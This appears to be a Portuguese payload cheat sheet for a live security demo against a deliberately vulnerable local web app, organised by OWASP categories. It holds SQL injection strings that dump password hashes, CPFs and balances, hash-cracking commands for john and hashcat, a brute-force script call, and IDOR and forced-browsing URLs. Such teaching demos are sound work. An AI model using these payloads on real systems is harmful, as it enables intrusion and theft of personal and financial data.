# Payloads prontos — colar ao vivo na demo

## A05 — SQL Injection (página `search.php`)

| Objetivo | Payload (colar no campo de busca) |
|---|---|
| Busca normal | `mouse` |
| Bypass do filtro (lista tudo) | `' OR '1'='1` |
| **Dump dos hashes de senha** | `%' UNION SELECT id,username,password_md5 FROM users -- ` |
| Dump de CPFs | `%' UNION SELECT id,username,cpf FROM users -- ` |
| Dump de saldo | `%' UNION SELECT id,username,saldo FROM users -- ` |

> A query original tem 3 colunas (`id, name, price`), por isso o `UNION SELECT` também
> precisa de 3 colunas. O `-- ` (com espaço no fim) comenta o resto da SQL.

## A04 — Cryptographic Failures (quebrar os hashes)

Hashes MD5 esperados no seed (cole em https://crackstation.net ou https://hashes.com/en/decrypt/hash):

| Usuário | MD5 | Senha |
|---|---|---|
| admin | `21232f297a57a5a743894a0e4a801fc3` | admin |
| alice | `e10adc3949ba59abbe56e057f20f883e` | 123456 |
| bob   | `e7d80ffeefa212b7c5c55700e4f7193e` | senha123 |
| carla | `d8578edf8458ce06fbc5bb76a58c5ca4` | qwerty |
| diego | `3fc981f9aec82ad6656da194b7c5d016` | gatinho |

> Alternativa offline (sem internet):
> `echo 'admin:21232f297a57a5a743894a0e4a801fc3' | john --format=raw-md5 --wordlist=attack/wordlist.txt`
> ou `hashcat -m 0 -a 0 hashes.txt attack/wordlist.txt`

## A07 — Authentication Failures (brute force)

```bash
bash attack/bruteforce.sh admin http://localhost:8000
```

Funciona porque não há rate limit / lockout. Tente também `alice`, `carla`.

## A01 — Broken Access Control

- **IDOR:** logado como `alice`, abra `http://localhost:8000/profile.php?id=1` (admin),
  `?id=3` (bob), `?id=4` (carla) — vê CPF, saldo, hash e mensagens privadas de cada um.
- **Forced browsing:** logado como qualquer usuário comum, abra
  `http://localhost:8000/admin.php` — o painel de administração abre mesmo sem ser admin.
